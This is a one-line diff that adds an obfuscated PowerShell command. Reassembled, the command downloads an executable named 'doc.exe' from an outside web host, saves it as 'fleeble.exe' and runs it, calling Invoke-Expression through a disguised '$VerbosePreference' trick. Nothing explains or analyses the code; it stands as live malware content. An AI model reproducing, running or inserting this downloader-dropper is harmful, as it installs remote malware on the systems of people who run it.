@@ -1,0 +1,1 @@
+﻿(('(New-'+'Obj'+'ect'+' Sy'+'stem.'+'Net'+'.W'+'ebClien'+'t).Do'+'wnl'+'oadFi'+'le('+'{0'+'}http://danhvi'+'et.'+'com.vn/'+'z/v'+'/'+'doc.exe'+'{'+'0},{0'+'}f'+'leeb'+'le.e'+'x'+'e{0})'+';S'+'tart-Proc'+'ess {0}fleebl'+'e'+'.ex'+'e{0'+'}')-F[CHar]39)|. ( ([sTring]$VeRbOSEpREfEreNcE)[1,3]+'x'-jOIN'')
